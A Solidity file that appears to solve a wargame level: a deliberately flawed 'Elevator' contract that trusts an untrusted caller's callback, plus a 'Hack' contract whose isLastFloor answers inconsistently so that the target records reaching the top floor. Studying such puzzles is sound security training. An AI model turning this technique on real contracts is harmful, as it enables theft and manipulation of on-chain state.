// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Hack is Building {
    Elevator private immutable target =
        Elevator(0x1B9feF8782589F040E31B88ab486a297A685eB70);
    bool isFirstCheck = true;

    function isLastFloor(uint256 _floor) external returns (bool) {
        require(msg.sender == address(target), "not designated caller");
        require(_floor <= 100);
        if (_floor == 100) {
            if (isFirstCheck) {
                isFirstCheck = false;
                return false;
            } else {
                isFirstCheck = true;
                return true;
            }
        } else {
            return false;
        }
    }

    function visitLastFloor() external {
        target.goTo(100);
    }
}
